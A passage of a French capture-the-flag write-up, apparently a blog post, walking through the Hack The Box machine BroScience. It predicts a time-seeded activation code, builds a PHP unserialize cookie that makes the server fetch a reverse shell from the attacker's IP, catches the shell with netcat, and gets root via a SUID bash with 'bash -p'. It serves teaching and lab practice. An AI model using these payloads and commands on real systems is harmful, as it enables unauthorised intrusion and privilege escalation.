+</span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pg_num_rows</span>($res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                                    $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_prepare</span>($db_conn, <span style="color:#e6db74">&#34;create_user_query&#34;</span>, <span style="color:#e6db74">&#39;INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)&#39;</span>);
+</span></span><span style="display:flex;"><span>                                    $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_execute</span>($db_conn, <span style="color:#e6db74">&#34;create_user_query&#34;</span>, <span style="color:#66d9ef">array</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>], <span style="color:#a6e22e">md5</span>($db_salt <span style="color:#f92672">.</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>]), $_POST[<span style="color:#e6db74">&#39;email&#39;</span>], $activation_code));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                    <span style="color:#75715e">// TODO: Send the activation link to email
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                    $activation_link <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://broscience.htb/activate.php?code=</span><span style="color:#e6db74">{</span>$activation_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                    $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Account created. Please check your email for the activation link.&#34;</span>;
+</span></span><span style="display:flex;"><span>                                    $alert_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;success&#34;</span>;
+</span></span><span style="display:flex;"><span>                                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                                    $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to generate a valid activation code, please try again.&#34;</span>;
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>                            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                                $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;An account with this email already exists.&#34;</span>;
+</span></span><span style="display:flex;"><span>                            }
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                            $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Username is already taken.&#34;</span>;
+</span></span><span style="display:flex;"><span>                        }
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Maximum username length is 100 characters.&#34;</span>;
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please enter a valid email address.&#34;</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Maximum email length is 100 characters.&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Passwords do not match.&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $alert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Please fill all fields in.&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Des <code>if</code>, dans des <code>if</code>, dans des <code>if</code>&hellip;</p>
+<p>Dans toute cette pagaille, on trouve notre réponse</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">https</span><span style="color:#f92672">://</span><span style="color:#f92672">broscience</span>.<span style="color:#a6e22e">htb</span><span style="color:#f92672">/</span><span style="color:#f92672">activate</span>.<span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#f92672">code</span><span style="color:#f92672">=</span>{<span style="color:#960050;background-color:#1e0010">$activation_code</span>}
+</span></span></code></pre></div><p>Maintenant, nous n&rsquo;avons plus qu&rsquo;à créer un compte, intercépter la requête et voir la réponse pour avoir la date exacte de création du compte, puis créer un code d&rsquo;activation qui correspond et l&rsquo;utiliser.</p>
+<p><img alt="2023-02-01-201911_1592x482_scrot" src="https://user-images.githubusercontent.com/77807503/216157414-fb374035-98c3-4818-b143-44d1b58b8bf9.png"></p>
+<p>On garde la date de côté: <code>Wed, 01 Feb 2023 19:19:02 GMT</code></p>
+<p>La <code>timestamp</code> correspondant à cette date est <code>1675279142</code> (via <a href="https://www.epochconverter.com/">https://www.epochconverter.com/</a>)</p>
+<p>On crée un fichier <code>.php</code> localement dans lequel on modifie la fonction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate_activation_code</span>() {
+</span></span><span style="display:flex;"><span>    $chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(<span style="color:#ae81ff">1675279142</span>);
+</span></span><span style="display:flex;"><span>    $activation_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $activation_code <span style="color:#f92672">=</span> $activation_code <span style="color:#f92672">.</span> $chars[<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($chars) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $activation_code;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">generate_activation_code</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">php</span> <span style="color:#f92672">code</span>.<span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">bHhA2C1tpYP8066v3bwaHbXda2LP6rGn</span>
+</span></span></code></pre></div><p>Maintenant, plus qu&rsquo;à visiter la page
+<code>/activate.php?code=bHhA2C1tpYP8066v3bwaHbXda2LP6rGn</code> pour activer le compte</p>
+<p>J&rsquo;ai pas la moindre idée de pourquoi ça a marché mais mon compte a été activé sans que je n&rsquo;aie rien à faire donc bon&hellip; mais le code aurait marché normalement et sinon il aurait fallu augmenter la <code>timestamp</code> de quelques secondes puisqu&rsquo;il peut y avoir eu une latence au niveau du backend.</p>
+<p>En re-regardant le code du utils.php, on remarque cette ligne:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$up <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($up_cookie));
+</span></span></code></pre></div><p>Un cookie est décodé depuis du <code>b64</code> puis <code>unserialize</code>, on va donc pouvoir effectuer une &ldquo;<em>unserialize attack</em>&rdquo; qui va modifier la class <code>AvatarInterface</code> et nous permettre d&rsquo;<strong>upload un shell</strong></p>
+<p>On va faire un script qui va créer un <strong>faux cookie</strong> avec notre class, pour ça, il nous faut aussi le code de la class <code>Avatar</code> (présent dans le <code>utils.php</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Avatar</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($imgPath) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span> <span style="color:#f92672">=</span> $imgPath;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save</span>($tmp) {
+</span></span><span style="display:flex;"><span>        $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($f, <span style="color:#a6e22e">file_get_contents</span>($tmp));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($f);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AvatarInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.14.109/revshell.php&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./revshell.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup() {
+</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>);
+</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AvatarInterface</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>On y met notre <code>IP</code> puisqu&rsquo;on va lancer un serveur pour qu&rsquo;il puisse récupérer notre <code>revshell.php</code>, puis il va ensuite écrire son contenu dans <code>revshell.php</code> grâce à la fonction <code>save()</code>.</p>
+<p>On lance le script, qui nous donne notre cookie en base64</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozMjoiaHR0cDovLzEwLjEwLjE0LjEwOS9yZXZzaGVsbC5waHAiO3M6NzoiaW1nUGF0aCI7czoxNDoiLi9yZXZzaGVsbC5waHAiO30=
+</span></span></code></pre></div><p>Avant de le mettre, il faut lancer un serveur <code>python</code> avec notre <code>revshell.php</code> dans le même répertoire</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><p>Dans une autre fenêtre, on lance notre <code>netcat</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">9001</span>
+</span></span></code></pre></div><p>Puis on met notre cookie, et on refresh la page</p>
+<p>Elle va être horrible et toute blanche puisque c&rsquo;est le cookie qui est sensé permettre de gérer le theme, mais ce n&rsquo;est pas grave</p>
+<p>On visite <a href="https://broscience.htb/revshell.php">https://broscience.htb/revshell.php</a> pour que notre script soit executé, et on reçoit la connection sur le <code>netcat</code></p>
+<p><img alt="2023-02-01-204310_1917x655_scrot" src="https://user-images.githubusercontent.com/77807503/216157456-afec9240-6f5d-4234-8479-d316e64b453b.png"></p>
+<p><em>On peut aussi confirmer qu&rsquo;il a bien lu le contenu de notre reverse shell car on voit les connections sur le serveur <code>python</code></em></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> export TERM<span style="color:#f92672">=</span>xterm
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>On commence par lister les fichiers ayant le <code>setuid bit</code> et appartenant à <code>root</code> (ces fichiers sont éxecutés avec les permissions <code>sudo</code>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>find <span style="color:#f92672">/</span> <span style="color:#f92672">-</span>user root <span style="color:#f92672">-</span>perm <span style="color:#f92672">-</span><span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;/</span>dev<span style="color:#f92672">/</span>null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>xorg<span style="color:#f92672">/</span>Xorg<span style="color:#f92672">.</span>wrap
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>openssh<span style="color:#f92672">/</span>ssh<span style="color:#f92672">-</span>keysign
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span>daemon<span style="color:#f92672">-</span>launch<span style="color:#f92672">-</span>helper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>pppd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>vmware<span style="color:#f92672">-</span>user<span style="color:#f92672">-</span>suid<span style="color:#f92672">-</span>wrapper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgrp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>fusermount3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>passwd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>su
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sudo
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chfn
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mount
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ntfs<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>g
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>umount
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>gpasswd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chsh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>libexec<span style="color:#f92672">/</span>polkit<span style="color:#f92672">-</span>agent<span style="color:#f92672">-</span>helper<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p><code>/usr/bin/bash</code> ?????</p>
+<p>Bon, bah ça va être rapide hein&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>man bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-p      Turn  on  privileged  mode.   In this mode, the $ENV and $BASH_ENV files are not processed, shell functions are not inherited from the environment, and the SHEL‐
+</span></span><span style="display:flex;"><span>                      LOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, <span style="color:#66d9ef">if</span> they appear in the environment, are ignored.  If the shell is started with the effective  user  <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span>  id
+</span></span><span style="display:flex;"><span>                      not  equal  to the real user <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span> id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id.  If the
+</span></span><span style="display:flex;"><span>                      -p option is supplied at startup, the effective user id is not reset.  Turning this option off causes the effective user and group ids to be set to the real user
+</span></span><span style="display:flex;"><span>                      and group ids.
+</span></span></code></pre></div><p>On peut donc donc éxecuter la commande <code>bash -p</code> pour qu&rsquo;il garde les privilèges, càd <code>sudo</code></p>
+<p><img alt="2023-02-01-204653_896x446_scrot" src="https://user-images.githubusercontent.com/77807503/216157475-8497878a-e038-4a9f-8dec-ed5205986008.png"></p>
+<p>gg!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/linux/">linux</a></span>
+        <span class="tag"><a href="/tags/fuzzing/">fuzzing</a></span>
+        <span class="tag"><a href="/tags/file-upload/">file upload</a></span>
+        <span class="tag"><a href="/tags/php-unserialize/">php unserialize</a></span>
+        <span class="tag"><a href="/tags/lfi/">LFI</a></span>
+        <span class="tag"><a href="/tags/privilege-escalation/">privilege escalation</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
